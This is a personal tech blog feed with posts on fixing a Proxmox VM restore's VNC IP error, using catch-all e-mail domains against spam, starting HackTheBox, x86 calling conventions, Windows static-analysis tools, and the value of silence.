&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;Well, Proxmox opens a VNC virtual screen when booting up a KVM machine, and the problem is that the backup carried the IP from the first Proxmox server, and now we’re asking the second Proxmox server to open a port in an IP that doesn’t belong to it.&lt;/p&gt;

&lt;p&gt;Specifically, the first line is a dead giveaway: “kvm: -vnc &lt;strong&gt;192.168.33.5:85&lt;/strong&gt;: Failed to start VNC server: Failed to bind socket: Cannot assign requested address”&lt;/p&gt;

&lt;p&gt;What we have to do is go into the virtual machine Proxmox config file, which should be located in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/pve/qemu-server/&amp;lt;VM ID&amp;gt;.conf&lt;/code&gt;, and in this case, because the machine ID is 115, the config file would be in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/pve/qemu-server/115.conf&lt;/code&gt;. The ID is manually selected when restoring the backup.&lt;/p&gt;

&lt;p&gt;The original contents of the file are as follows.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;args: -vnc 192.168.33.5:85
balloon: 1024
bootdisk: ide0
cores: 1
ide0: local:115/vm-115-disk-1.raw,cache=writeback,size=50G
ide2: none,media=cdrom
memory: 5120
name: xyz
net0: e1000=xx:xx:xx:xx:xx:xx,bridge=vmbr1
numa: 0
onboot: 1
ostype: win8
scsihw: virtio-scsi-pci
smbios1: uuid=abcd
sockets: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our second machine has the IP &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.33.10&lt;/code&gt;, but this depends on your Proxmox and network configuration. The IP address of any Linux machine can be consulted by running &lt;code class=&quot;highlighter-rouge&quot;&gt;ip addr show&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We only need to change the first line, to have the correct IP. Once this is done, the machine will boot successfully, but if you haven’t already, it might be desirable to change the MAC address of the network adapter as well, depending on your network configuration, to avoid collisions, and maybe the network bridge in case the NAT in your second Proxmox server is set up differently.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;args: -vnc 192.168.33.10:85
[...]
net0: e1000=yy:yy:yy:yy:yy:yy,bridge=vmbr1
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That’s it!&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Proxmox" /><category term="tip" /><summary type="html">Note: This issue appears on Proxmox 5.2-x, always check the date of the post when troubleshooting your systems.</summary></entry><entry><title type="html">The DEFINITIVE guide to defeating spammers</title><link href="http://localhost:4000/2018/06/14/defeat-spammers" rel="alternate" type="text/html" title="The DEFINITIVE guide to defeating spammers" /><published>2018-06-14T09:35:20+02:00</published><updated>2018-06-14T09:35:20+02:00</updated><id>http://localhost:4000/2018/06/14/defeat-spammers</id><content type="html" xml:base="http://localhost:4000/2018/06/14/defeat-spammers">&lt;p&gt;Nowadays, spamming is a very common technique, and nobody can deny that. Spamming is so cheap that even a 10% opening rate is a tremendous success, because sending e-mails doesn’t require paying fees to ISPs (like you would with mass SMSs and robocalls), and it also doesn’t require hiring anyone to take the time to manually write and send e-mails (as opposed to postal spam, which have to be physically delivered into mailboxes by people), when you can just buy e-mail addresses in bulks by thousands of providers that sell active e-mail addresses by prices so ridiculously affordable, it lowers the barrier to entry dramatically.&lt;/p&gt;

&lt;p&gt;This is why, nowadays, postmasters and system administrators need to be aware of (and correctly implement) the many technologies that exist to reduce the amount of spam received. Among them:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.dkim.org/&quot;&gt;DKIM (DomainKeys Identified Mail)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://dmarc.org/&quot;&gt;DMARC (Domain-based Message Authentication, Reporting &amp;amp; Conformance)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.openspf.org&quot;&gt;SPF (Sender Policy Framework)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.dnsbl.info/&quot;&gt;DNSBLs (Domain Name System Blacklists)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.greylisting.org/&quot;&gt;Greylisting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://spamassassin.apache.org/&quot;&gt;SpamAssassin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Most e-mail servers implement these tools to some degree, or use alternatives, of which there are plenty. Especially the first three elements are considered an integral part of e-mail technology nowadays, and most e-mail servers will reject your mail if you haven’t properly implemented these technologies in your service.&lt;/p&gt;

&lt;p&gt;However, like I said, spam being such a cheap technique, hasn’t really decreased at all in volume. What happened is that spam filters now use machine learning and are able to train themselves on what legitimate e-mail and spam look like, decreasing false positives and greatly avoiding the chances of getting a spam e-mail in your inbox, but spammers haven’t ever stopped trying, and it doesn’t look like the problem is going to go away soon.&lt;/p&gt;

&lt;p&gt;A few years ago, I came up with a technique that would dramatically decrease received spam volume, and, at the same time, hold the companies that sell your data accountable. Actually, it has many benefits, because it also increases privacy, by making the collection and discovery of accounts impossible by just trying e-mails from public breach dumps, and eliminates the chance of having your online accounts breached even with password reuse (but seriously, do &lt;strong&gt;NOT&lt;/strong&gt; reuse your passwords, ever).&lt;/p&gt;

&lt;p&gt;It all started because I used to have two e-mail addresses. A “spammy” one I would use to sign up for fishy stuff, or for websites that required me to log in to see their content. The other “good” would be my personal e-mail address, and I would use it only to sign up for trustworthy websites and give away to people so they can contact me. By “trustworthy” websites I mean companies that are relatively well established, such as Facebook, Twitter, Valve, Apple, you name it.&lt;/p&gt;

&lt;p&gt;Well, turns out big companies also have data breaches. So my “good” e-mail address eventually ended up in public data leaks, and spam e-mail would start to flow in. Even though it was a Gmail account, and Google is rather great at stopping e-mail, I was still annoyed, mostly by the fact I didn’t really know who betrayed me and gave my e-mail address away! (Or simply got breached). The worst thing is that if I attended to conferences, for example, a few months later I would start receiving unsolicited e-mail, not only from the organisers of the conference, but even from companies I didn’t even know about, which I knew came from one of those conferences, but I couldn’t prove it or specify exactly which of these conferences gave my e-mail address away.&lt;/p&gt;

&lt;p&gt;We can all agree giving away your customer’s information for marketing purposes is pretty despicable and shameless, but companies keep doing it because you can’t really know who did it.&lt;/p&gt;

&lt;p&gt;But what if you had a different e-mail address for every single service you signed up for? Well, even with password managers, signing up for a single Gmail account can take a few minutes, don’t even imagine having to go through that process every single time you sign up for a website you might not use ever again.&lt;/p&gt;

&lt;p&gt;So there had to be a better way…&lt;/p&gt;

&lt;h1 id=&quot;catch-all-domains&quot;&gt;Catch-all domains&lt;/h1&gt;

&lt;p&gt;The solution I came up with didn’t require any more time than what’s typical when signing up for an online service, and shouldn’t necessarily cost more than 10 dollars a year (if you already have your own e-mail server), but it had a profound impact in how I approach sign-ups nowadays.&lt;/p&gt;

&lt;p&gt;Basically, I purchased a domain I would use exclusively for e-mail. It needed to be sort and legible, so .com domains were out of the question, but the introduction of new TLDs have greatly decreased the chances of having your favourite domain name taken by &lt;a href=&quot;https://en.wikipedia.org/wiki/Cybersquatting&quot;&gt;domain squatters&lt;/a&gt;, as you only have to choose a different TLD if the domain name you want is taken.&lt;/p&gt;

&lt;p&gt;Then, I had to configure my e-mail server to accept mails from said domain, and have it redirect all e-mails to my actual inbox. Since replying from each address was not necessary, I didn’t have to set up individual accounts on my mail server. If I ever need to reply to someone’s e-mail, I reply with my personal e-mail address.&lt;/p&gt;

&lt;p&gt;Now I can quickly identify where e-mail comes from, and if a company decides to sell my data to spammers, I will know immediately just by looking at the address it was sent to. For example, imagine my e-mail domain is “spameater.online” (hint: It isn’t). If I sign up for Twitter as “twitter@spameater.online”, and suddenly start receiving viagra ads addressed to “twitter@spameater.online”, I’ll know Twitter betrayed me, and I can decide to close my account there.&lt;/p&gt;

&lt;p&gt;Now comes the best part. Since no real accounts were created to handle all the incoming e-mail traffic, if I start receiving spam at any of the addresses, blocking e-mail traffic is as easy as having my server (Postfix) drop all incoming e-mail for any address I want. Problem solved, my other e-mail addresses are not published (yet), so there’s no need to worry.&lt;/p&gt;

&lt;p&gt;As a side benefit, like I said before, even if I shared passwords across services, hackers would be unable to log in, because the e-mail address I use in every service is different. Obviously, if I used simply &lt;nameoftheservice&gt;@spameater.online, it wouldn't be very difficult for a determined attacker to breach into my accounts by changing the e-mail address, so instead of that, to make things even more difficult, I use alphanumeric combinations of variable length as usernames, like 1b7dp64aafg6@spameater.online for Twitter, 454gy4nm6a@spameater.online for Facebook, and m93c1@spameater.online for iCloud, and save the e-mail address and password to my password manager.&lt;/nameoftheservice&gt;&lt;/p&gt;

&lt;p&gt;The results have been dramatically positive. In the last 2 years I have been using this experiment, I have received exactly 0 (&lt;strong&gt;ZERO&lt;/strong&gt;) spam e-mails, although, in all honesty, I do apply all the technologies mentioned at the top of the article, so spammers already have a hard time spamming me, with the catch-all domain feature being just another layer I can quickly and effectively disable for specific addresses.&lt;/p&gt;

&lt;p&gt;Want to learn more and/or implement it yourself? Check out the links below. If you still have questions, you can leave a comment below, or try getting in touch with me, but replies are not guaranteed 😉.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://serverfault.com/questions/560906/postfix-virtual-aliases-and-catchall-for-undefined-addresses&quot;&gt;https://serverfault.com/questions/560906/postfix-virtual-aliases-and-catchall-for-undefined-addresses&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tecadmin.net/setup-catch-all-email-account-in-postfix/&quot;&gt;https://tecadmin.net/setup-catch-all-email-account-in-postfix/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cyberciti.biz/faq/howto-setup-postfix-catch-all-email-accounts/&quot;&gt;https://www.cyberciti.biz/faq/howto-setup-postfix-catch-all-email-accounts/&lt;/a&gt;&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="productivity" /><category term="tip" /><category term="privacy" /><summary type="html">Nowadays, spamming is a very common technique, and nobody can deny that. Spamming is so cheap that even a 10% opening rate is a tremendous success, because sending e-mails doesn’t require paying fees to ISPs (like you would with mass SMSs and robocalls), and it also doesn’t require hiring anyone to take the time to manually write and send e-mails (as opposed to postal spam, which have to be physically delivered into mailboxes by people), when you can just buy e-mail addresses in bulks by thousands of providers that sell active e-mail addresses by prices so ridiculously affordable, it lowers the barrier to entry dramatically.</summary></entry><entry><title type="html">The fun begins: HackTheBox.eu</title><link href="http://localhost:4000/2018/06/10/fun-begins" rel="alternate" type="text/html" title="The fun begins: HackTheBox.eu" /><published>2018-06-10T15:30:34+02:00</published><updated>2018-06-10T15:30:34+02:00</updated><id>http://localhost:4000/2018/06/10/fun-begins</id><content type="html" xml:base="http://localhost:4000/2018/06/10/fun-begins">&lt;p&gt;It’s been a while since I joined https://www.hackthebox.eu/. Probably more than a year. And I haven’t really had the time to spend trying to break into the machines, because of my university studies, but now summer is coming, so I will be able to dedicate more resources to it.&lt;/p&gt;

&lt;p&gt;In case you don’t know the website, it’s a collection of vulnerable virtual machines that are designed to be hacked. It’s kind of a CTF (Capture The Flag) competition. Actually, even joining the website is a CTF challenge (sorry, I’m not giving away hints).&lt;/p&gt;

&lt;p&gt;In about 30 minutes, I managed my first user own,  with the &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/132&quot;&gt;Poison&lt;/a&gt; machine by &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/11060&quot;&gt;Charix&lt;/a&gt;. To be completely honest, it was disappointingly easy. Disappointing in an unrealistic manner, as in: No real system administrator would set up his username account like that. So easy, in fact, I was able to obtain a shell in very little time.&lt;/p&gt;

&lt;p&gt;In any case, I’m now stuck on the second step: Obtaining root privileges.&lt;/p&gt;

&lt;p&gt;Most machines are set up like that: You need to gain user privileges, and then root privileges. You prove this by providing what’s called a “flag”. This flag is a secret string that you’re able to read only after you have reached the required privilege level.&lt;/p&gt;

&lt;p&gt;I intend to dedicate at least one hour daily to learning security tools and breaking into HackTheBox machines (preferably, much, much more, especially during the summer).&lt;/p&gt;

&lt;p&gt;You can &lt;a href=&quot;https://www.hackthebox.eu/profile/1904&quot;&gt;follow me&lt;/a&gt;, and message me. I love challenges!&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="HackTheBox" /><summary type="html">It’s been a while since I joined https://www.hackthebox.eu/. Probably more than a year. And I haven’t really had the time to spend trying to break into the machines, because of my university studies, but now summer is coming, so I will be able to dedicate more resources to it.</summary></entry><entry><title type="html">x86 Function call conventions</title><link href="http://localhost:4000/2018/06/09/function-calls" rel="alternate" type="text/html" title="x86 Function call conventions" /><published>2018-06-09T11:57:04+02:00</published><updated>2018-06-09T11:57:04+02:00</updated><id>http://localhost:4000/2018/06/09/function-calls</id><content type="html" xml:base="http://localhost:4000/2018/06/09/function-calls">&lt;p&gt;Another cybersecurity post. Focused on binary (dis)assembly.&lt;/p&gt;

&lt;p&gt;This time it’s about how different compilers turn high-level programming language code into low-level assembly code, in regards to function calling.&lt;/p&gt;

&lt;p&gt;As a sample, I’ll use a pseudocode call like &lt;code class=&quot;highlighter-rouge&quot;&gt;test(a,b,c,d)&lt;/code&gt; to demonstrate how it would look like in regards to different conventions.&lt;/p&gt;

&lt;p&gt;Keep in mind &lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt; is a pseudoinstruction that subtracts 4 from the stack pointer (ESP), and then writes the value onto the memory ESP points to. &lt;code class=&quot;highlighter-rouge&quot;&gt;pop&lt;/code&gt; is the opposite: reads from the address ESP points to, and then adds 4.&lt;/p&gt;

&lt;h1 id=&quot;cdecl&quot;&gt;cdecl&lt;/h1&gt;

&lt;p&gt;It’s used by many C compilers.&lt;/p&gt;

&lt;p&gt;In Linux, the GNU Compiler Collection (GCC) sets the cdecl de facto standard.&lt;/p&gt;

&lt;h2 id=&quot;conditions&quot;&gt;Conditions&lt;/h2&gt;

&lt;p&gt;The registers ST0 through ST7 are empty when calling a function.&lt;/p&gt;

&lt;p&gt;ST1 through ST7 are empty upon exiting a function, and if no floating point is returned, ST0 is empty too.&lt;/p&gt;

&lt;h2 id=&quot;arguments-and-return-values&quot;&gt;Arguments and return values&lt;/h2&gt;

&lt;p&gt;Arguments are passed on the stack, right-to-left (C style).&lt;/p&gt;

&lt;p&gt;For returns, integers and memory addresses are in EAX, whereas floating points will be in the ST0 x87 register.&lt;/p&gt;

&lt;h2 id=&quot;clean-up&quot;&gt;Clean-up&lt;/h2&gt;

&lt;p&gt;Registers EAX, ECX and EDX are caller-saved, and the rest are callee-saved.&lt;/p&gt;

&lt;p&gt;The stack pointer (ESP) is cleaned by the caller.&lt;/p&gt;

&lt;h2 id=&quot;pseudocode-assembly&quot;&gt;Pseudocode assembly&lt;/h2&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;test&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result will be in EAX, and floating point values in ST*.&lt;/p&gt;

&lt;h1 id=&quot;syscall&quot;&gt;syscall&lt;/h1&gt;

&lt;p&gt;Similar to cdecl.&lt;/p&gt;

&lt;p&gt;It’s the convention for the 32 bit OS/2 API.&lt;/p&gt;

&lt;h2 id=&quot;arguments-and-return-values-1&quot;&gt;Arguments and return values&lt;/h2&gt;

&lt;p&gt;Arguments are passed on the stack, right-to-left (C style). The size of the parameter list in doublewords is passed in AL.&lt;/p&gt;

&lt;p&gt;Return values are in EAX.&lt;/p&gt;

&lt;h2 id=&quot;clean-up-1&quot;&gt;Clean-up&lt;/h2&gt;

&lt;p&gt;ECX, and EDX are cleared upon exiting the function call.&lt;/p&gt;

&lt;p&gt;The stack pointer (ESP) is cleaned by the caller.&lt;/p&gt;

&lt;h2 id=&quot;pseudocode-assembly-1&quot;&gt;Pseudocode assembly&lt;/h2&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;test&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result will be in EAX, and floating point values in ST*.&lt;/p&gt;

&lt;h1 id=&quot;microsoft-fastcall&quot;&gt;Microsoft fastcall&lt;/h1&gt;

&lt;p&gt;This convention is better than the previous two in terms of performance, hence its “fast” prefix.&lt;/p&gt;

&lt;p&gt;However, the fastcall convention is not standarised, and varies a lot from compiler to compiler, so I’ll focus in the Microsoft implementation. In this case, GCC’s &lt;code class=&quot;highlighter-rouge&quot;&gt;__msfastcall&lt;/code&gt; is similar.&lt;/p&gt;

&lt;h2 id=&quot;arguments-and-return-values-2&quot;&gt;Arguments and return values&lt;/h2&gt;

&lt;p&gt;First two arguments are passed left-to-right into ECX and EDX. The remaining arguments are pushed onto the stack from right to left.&lt;/p&gt;

&lt;p&gt;Microsoft compilers behave differently for IA64 and AMD64 architectures, because of additional registers. They simply use their own x64 calling convention, regardless of what was specified to the compiler.&lt;/p&gt;

&lt;h2 id=&quot;clean-up-2&quot;&gt;Clean-up&lt;/h2&gt;

&lt;p&gt;The callee is responsible for cleaning the stack, as well as the ECX and EDX registers.&lt;/p&gt;

&lt;h2 id=&quot;pseudocode-assembly-2&quot;&gt;Pseudocode assembly&lt;/h2&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;test&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result will be in EAX, and floating point values in ST*.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="software-rev" /><category term="assembly" /><category term="x86" /><summary type="html">Another cybersecurity post. Focused on binary (dis)assembly.</summary></entry><entry><title type="html">Static analysis tools for Windows</title><link href="http://localhost:4000/2018/06/08/windows-static" rel="alternate" type="text/html" title="Static analysis tools for Windows" /><published>2018-06-08T13:08:50+02:00</published><updated>2018-06-08T13:08:50+02:00</updated><id>http://localhost:4000/2018/06/08/windows-static</id><content type="html" xml:base="http://localhost:4000/2018/06/08/windows-static">&lt;p&gt;I’m currently studying malware analysis, so I wanted to write a post on the tools I’ve been using recently, to serve as a reference for me and hopefully for anyone interested in binary reversing.&lt;/p&gt;

&lt;p&gt;Some tools will have functionality that overlaps with other of the listed tools. It’s up to you which one to use.&lt;/p&gt;

&lt;h1 id=&quot;free-tools&quot;&gt;Free tools&lt;/h1&gt;

&lt;p&gt;Either fully open source, or freeware (unrestricted, so no shareware).&lt;/p&gt;

&lt;h2 id=&quot;dependency-walker&quot;&gt;&lt;a href=&quot;http://dependencywalker.com/&quot;&gt;Dependency Walker&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Displays a hierarchical tree diagram of all dependant modules, with exported, and imported functions.&lt;/p&gt;

&lt;h2 id=&quot;filealyzer&quot;&gt;&lt;a href=&quot;https://www.safer-networking.org/products/filealyzer/&quot;&gt;FileAlyzer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Application with functionality to show resources, PE headers, hex dumps, INI contents, and more. It can read UPX compressed files, ELF (Linux) as well as regular DLL and EXE files.&lt;/p&gt;

&lt;h2 id=&quot;hxd&quot;&gt;&lt;a href=&quot;https://mh-nexus.de/en/hxd/&quot;&gt;HxD&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hexadecimal editor. Everyone has their own favourite, but this one works well and is free.&lt;/p&gt;

&lt;h2 id=&quot;malcode-analyst-pack&quot;&gt;&lt;a href=&quot;http://www.sandsprite.com/iDef/MAP/&quot;&gt;Malcode Analyst Pack&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Pack containing lots of useful software and added functionality to aid in static analysis. Among other utilities, it installs shell extensions (that appear upon right-clicking files and folders) for computing MD5 tools, or showing the strings on a file.&lt;/p&gt;

&lt;h2 id=&quot;pebrowse&quot;&gt;&lt;a href=&quot;http://www.smidgeonsoft.prohosting.com/pebrowse-pro-file-viewer.html&quot;&gt;PEBrowse&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Windows disassembler for 64 and 32 bit programs. Presents the PE structure, with its headers, imports, exports, debug symbols and more in an intuitive GUI. Comes with helpful tools such as hex/ASCII equivalents, window messages and error codes. It also displays metadata for .NET assemblies.&lt;/p&gt;

&lt;h2 id=&quot;peid&quot;&gt;PEiD&lt;/h2&gt;

&lt;p&gt;Detects common packers, cryptors and compilers for PE files.&lt;/p&gt;

&lt;p&gt;The official website seems to have been discontinued, but you can download it &lt;a href=&quot;http://localhost:4000/assets/other/PEiD-0.95.zip&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;pev&quot;&gt;&lt;a href=&quot;http://pev.sourceforge.net/&quot;&gt;pev&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Command-line open source tool to analyse PE files. Runs on Windows, macOS and Linux.&lt;/p&gt;

&lt;h2 id=&quot;peview&quot;&gt;&lt;a href=&quot;http://wjradburn.com/software/&quot;&gt;PEView&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Shows the structure of a PE and COFF file, dispalying headers, sections, import/export tables, and resource information in file types such as EXE and DLL.&lt;/p&gt;

&lt;h2 id=&quot;resource-hacker&quot;&gt;&lt;a href=&quot;http://angusj.com/resourcehacker/&quot;&gt;Resource Hacker&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Shows resources, such as images, dialogs, executables and binaries embedded in PE files such as EXE and DLL.&lt;/p&gt;

&lt;h2 id=&quot;radare2&quot;&gt;&lt;a href=&quot;http://www.radare.org/r/&quot;&gt;Radare2&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Better known for its dynamic analysis capabilities, it is also capable of performing binary diffing, extract relocation tables, and of course disassemble binaries written in multiple languages for many different architectures.&lt;/p&gt;

&lt;h2 id=&quot;sysinternals-suite&quot;&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite&quot;&gt;Sysinternals Suite&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Not exactly a tool, but a collection of tools, as the name implies.&lt;/p&gt;

&lt;p&gt;Here are a few interesting ones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Sigcheck&lt;/strong&gt;: Shows file version number, timestamp and digital signature details, and optionally allows for VirusTotal sample uploads.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Strings&lt;/strong&gt;: Shows hardcoded strings in an executable file.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Whois&lt;/strong&gt;: Similar to the Unix tool, shows details on a given Internet address. Maybe you want to investigate a certain string pointing to a domain?&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;upx&quot;&gt;&lt;a href=&quot;https://upx.github.io/&quot;&gt;UPX&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Very popular executable packer used by malware authors. You can unpack some UPX-packed executables by supplying the command-line option &lt;code class=&quot;highlighter-rouge&quot;&gt;-d&lt;/code&gt; to the &lt;code class=&quot;highlighter-rouge&quot;&gt;upx&lt;/code&gt; tool.&lt;/p&gt;

&lt;h1 id=&quot;paid-tools&quot;&gt;Paid tools&lt;/h1&gt;

&lt;h2 id=&quot;pe-explorer&quot;&gt;&lt;a href=&quot;http://heaventools.com/&quot;&gt;PE Explorer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Resource editor, UPX unpacker, disassembler, dependency scanner and more.&lt;/p&gt;

&lt;h2 id=&quot;pestudio&quot;&gt;&lt;a href=&quot;https://winitor.com/&quot;&gt;PEStudio&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;PEStudio implements very useful features aimed to help detecting anomalies and suspicious patterns. It ships with VirusTotal functionality that queries the service for MD5 hashes of a file. It also list imports and resources. Ships with both a GUI and CLI versions.&lt;/p&gt;</content><author><name>León Castillejos</name><email>L1Cafe-github@tuta.io</email></author><category term="Cybersecurity" /><category term="Microsoft" /><category term="software-rev" /><category term="static-analysis" /><summary type="html">I’m currently studying malware analysis, so I wanted to write a post on the tools I’ve been using recently, to serve as a reference for me and hopefully for anyone interested in binary reversing.</summary></entry><entry><title type="html">The power of silence</title><link href="http://localhost:4000/2018/06/04/silence" rel="alternate" type="text/html" title="The power of silence" /><published>2018-06-04T04:43:31+02:00</published><updated>2018-06-04T04:43:31+02:00</updated><id>http://localhost:4000/2018/06/04/silence</id><content type="html" xml:base="http://localhost:4000/2018/06/04/silence">&lt;p&gt;I find silence to be grossly underestimated. We live in an era of permanent distraction. Companies use loud, aggressive marketing in the form of advertisements to grab your attention and get you to buy whatever it is they’re selling. Our smartphones have become distraction devices that instead of boosting our productivity, and increase our focus, are loaded of applications that send notifications indiscriminately, connecting us to real-time events instantly.&lt;/p&gt;

&lt;p&gt;Over time, we have been lured as a society towards a new norm of instant information and notifications, and as individuals, it has become increasingly more difficult to enjoy silence and quietness in our daily lives. The rise of buzzling, cosmopolitan and ecletic cities, full of people and cars all day every day means everything is now more accessible and reachable than ever. We seem to be more connected than ever, at the cost of our personal selves.&lt;/p&gt;

&lt;p&gt;This is clearly torpedoing our deep focus ability and impacting our mental performance. That’s why silence sanctuaries have been created, such as libraries, and noise pollution laws regulate and restrict noise in different areas and times of the day. This has lead to warning signs that constantly remind us of remaining quiet in these silence zones.&lt;/p&gt;

&lt;p&gt;We need silence to focus and relax. In fact, noise pollution can have a tremendously negative impact in our health, and knowingly or not, we contribute to generating noise every day. It is urgent that we learn to accept and appreciate silence. For the benefit of our community and our own selves.&lt;/p&gt;

&lt;p&gt;Richard Yates said: “Never say anything that doesn’t improve on silence.”, and that’s a great start. I try to keep small talk and non-constructive criticism away, as I don’t believe they bring anything of value. But I also try not to make noise, in general, when, for example, moving furniture, or when having a phone conversation (that is, I don’t maintain conversations in small, enclosed spaces, like buses or trains).&lt;/p&gt;

